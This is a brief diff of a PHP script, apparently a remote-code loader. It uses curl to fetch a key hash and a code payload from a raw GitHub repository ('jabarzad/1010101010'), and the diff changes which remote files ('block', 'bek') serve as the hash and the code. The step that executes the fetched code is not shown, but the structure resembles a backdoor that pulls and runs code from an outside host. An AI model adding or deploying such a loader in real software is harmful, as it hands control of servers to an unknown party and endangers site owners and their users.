@@ -10,8 +10,8 @@ function get_contents($url) {
     curl_close($ch);
     return $result;
 }
-$hashUrl = 'https://raw.githubusercontent.com/jabarzad/1010101010/refs/heads/main/bek';
-$codeUrl = 'https://raw.githubusercontent.com/jabarzad/1010101010/refs/heads/main/worker';
+$hashUrl = 'https://raw.githubusercontent.com/jabarzad/1010101010/refs/heads/main/block';
+$codeUrl = 'https://raw.githubusercontent.com/jabarzad/1010101010/refs/heads/main/bek';
 $keyHash = trim(get_contents($hashUrl));
 if (empty($keyHash)) {
     die("Die! Hash URL.\n");
